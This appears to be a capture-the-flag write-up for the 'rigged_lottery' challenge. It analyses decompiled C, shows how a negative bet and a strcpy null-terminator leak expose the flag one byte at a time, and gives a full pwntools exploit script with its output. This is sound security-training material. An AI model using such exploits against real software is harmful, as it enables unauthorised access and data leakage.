# rigged_lottery


```text
Is everything in life completely random? Are we unable to change our fate? Or maybe we can change the future and even manipulate randomness?! Is luck even a thing? Try your "luck"!
```

## initial review


### main

```c
void main(void)

{
  setup();
  welcome();
  generate();
  do {
    menu();
  } while( true );
}
```
I will omit setup & welcome because they don't have anything interesting -- just writing a welcome message and setting io buffer settings.  Otherwise, nothing interesting to note here except that generate gets called once before we get to do anything. 

### generate

```c
void generate(void)

{
  long in_FS_OFFSET;
  int local_44;
  int local_40;
  int local_3c;
  char local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_44 = 1;
  local_40 = 0;
  if (_flag == 0) {
    printf("\nLength of number (1-32): ");
    __isoc99_scanf(&DAT_00102073,&local_44);
    if ((local_44 < 0x22) && (-1 < local_44)) {
      memset(local_38,0,(long)local_44);
      local_3c = open("/dev/urandom",0);
      if (local_3c < 0) {
        fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
        exit(0x69);
      }
      read(local_3c,local_38,(long)local_44);
      while (local_40 < local_44) {
        while (local_38[local_40] == '\0') {
          read(local_3c,local_38 + local_40,1);
        }
        local_40 = local_40 + 1;
      }
      strcpy(lucky_number,local_38);
      close(local_3c);
      puts("\nLucky number generated successfuly! Try your luck!");
    }
    else {
      puts("\nInvalid size!");
    }
  }
  else {
    _flag = 0;
    local_3c = open("/dev/urandom",0);
    if (local_3c < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_3c,lucky_number,0x21);
    close(local_3c);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
The generate function has two main branches: the else branch runs the first time this function is called and populates `lucky_number` with random numbers.  The `if _flag == 0` branch runs any time after the first because `_flag` is set to 0 in the else branch.  It will ask for a number between 0 and 32, read that many bytes from /dev/urandom, and then use `strcpy` to move those bytes to `lucky_number`.  It should be noted that `strcpy` is meant to copy strings not raw bytes and has a couple peculiarites.  Namely that it also copies the terminating null byte from the source (because C strings are always null terminated).  The implication here is that if we generate a number of bytes smaller than the max size of `lucky_number` it will leave a null byte in `lucky_number`

### menu

```c
void menu(void)

{
  long in_FS_OFFSET;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf((char *)(double)cosy_coins,
                  
         "\nCurrent cosy coins: %.2f\n\n1. Generate lucky number.\n2. Play game.\n3. Claimprize.\n4. Exit.\n"
        );
  __isoc99_scanf(&DAT_00102073,&local_14);
  if (local_14 == 4) {
    puts("Goodbye!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x45);
  }
  if (local_14 < 5) {
    if (local_14 == 3) {
      claim();
      goto code_r0x0010174a;
    }
    if (local_14 < 4) {
      if (local_14 == 1) {
        generate();
        goto code_r0x0010174a;
      }
      if (local_14 == 2) {
        play();
        goto code_r0x0010174a;
      }
    }
  }
  puts("Invalid option!\n");
  menu();
code_r0x0010174a:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

Nothing super interesting here: we can either regenerate lucky numbers, play the game, or claim a prize.  

### play

```c
void play(void)

{
  int iVar1;
  long in_FS_OFFSET;
  float local_18;
  int local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nHow many coins do you want to bet?");
  __isoc99_scanf(&DAT_001020e4,&local_18);
  cosy_coins = cosy_coins - local_18;
  iVar1 = coin_check((ulong)(uint)cosy_coins);
  if (iVar1 != 0) {
    local_14 = open("/dev/urandom",0);
    if (local_14 < 0) {
      fwrite("\nError opening /dev/urandom, exiting..\n",1,0x27,stderr);
                    /* WARNING: Subroutine does not return */
      exit(0x22);
    }
    read(local_14,rigged_number,0x31);
    close(local_14);
    iVar1 = strcmp(lucky_number,rigged_number);
    if (iVar1 == 0) {
      puts("\nYou won! Claim your reward!");
      prize_flag = 1;
    }
    else {
      puts("\nYou lost! Try again!");
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We win if our lucky number is the same as the random numbers it generates.  It's using /dev/urandom so that doesn't seem very easy to attack.  The only thing I can think of would be getting a null byte into the first byte of `lucky_number` and then trying repeatedly until `/dev/urandom` gives us a null byte in the first byte of `rigged_number`.  It also doesn't do any bounds checking on the number of coins we bet which means we can bet a negative number of coins and get an arbitrary number of coins that way.  

### claim

```c
void claim(void)

{
  int __fd;
  long in_FS_OFFSET;
  int local_40;
  byte local_38 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  if ((prize_flag == 0) && (cosy_coins <= 100.00000000)) {
    puts("\nNo prizes available!");
    if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
      __stack_chk_fail();
    }
    return;
  }
  puts("\nEnjoy your prize!!\n");
  cosy_coins = cosy_coins + 269.00000000;
  local_40 = 0;
  __fd = open("./flag.txt",0);
  if (__fd < 0) {
    fwrite("\nError opening flag, exiting..\n",1,0x1f,stderr);
                    /* WARNING: Subroutine does not return */
    exit(0x6969);
  }
  read(__fd,local_38,0x21);
  while (local_40 < 0x21) {
    local_38[local_40] = local_38[local_40] ^ lucky_number[local_40];
    local_40 = local_40 + 1;
  }
  close(__fd);
  printf("%s",local_38);
                    /* WARNING: Subroutine does not return */
  exit(0xa9);
}
```

So, we get the flag if `prize_flag` is true or if we have more than 100 coins.  It's pretty trivial to get more than 100 coins which makes it quite unfortunate that what we actually get is the flag bitwise XORed with our lucky number.  

## putting it all together

So, we can print out the flag XORed with our lucky number but where do we go from there?  It's populated with random bytes at startup and attacking `/dev/urandom` would be tough at best.  If you'll recall, the generate function uses `strcpy` to copy the randomly generated bytes into `lucky_number` which will always copy a null terminator also.  This means that if generate n random bytes then there will be a null byte in `lucky_number[n]` which means we can leak a single byte of the flag.  We can then just do this multiple times to leak every character and then attach them together.  

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("rigged_lottery")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("docker.hackthebox.eu", 30269)


def main():

    buf = ""
    for i in range(len(buf),32):
        r = conn()
        r.recvuntil("4. Exit.\n")
        r.sendline("2")
        r.sendline("-300")
        r.recvuntil("4. Exit.\n")
        r.sendline("1")
        r.sendline(str(i))
        r.recvuntil("4. Exit.\n")
        r.sendline("3")
        r.recvuntil("prize!!\n\n")
        res = r.recvall()
        buf += chr(res[i])
        print(buf)

if __name__ == "__main__":
    main()
```


```text
❯ python rigged_lottery.py SILENT=1
HTB{strcpy_0nly_c4us3s_tr0ubl3!}
```

